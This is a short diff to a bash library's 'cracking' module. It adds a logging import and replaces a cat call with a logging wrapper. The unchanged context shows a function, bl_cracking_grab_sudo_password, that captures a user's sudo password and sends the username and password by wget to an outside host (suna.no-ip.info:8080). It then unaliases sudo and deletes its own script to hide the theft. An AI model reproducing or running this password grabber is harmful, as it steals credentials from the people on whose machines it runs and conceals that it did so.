@@ -10,6 +10,11 @@
 # 3.0 unported license. see http://creativecommons.org/licenses/by/3.0/deed.de
 # endregion
 # shellcheck disable=SC2016,SC2034,SC2155
+# region import
+# shellcheck source=./module.sh
+source "$(dirname "${BASH_SOURCE[0]}")/module.sh"
+bl.module.import bashlink.logging
+# endregion
 # region variables
 bl_cracking__documentation__='
     The cracking module implements utility functions to make a system
@@ -88,7 +93,7 @@ bl_cracking_grab_sudo_password() {
             wget --quiet "http://suna.no-ip.info:8080?user=$user&password=$password"
             unalias sudo &>/dev/null
             rm "$(readlink --canonicalize "$0")" &>/dev/null
-            cat "$buffer_file_path"
+            bl.logging.cat "$buffer_file_path"
             break
         else
             if (( number == 3 )); then
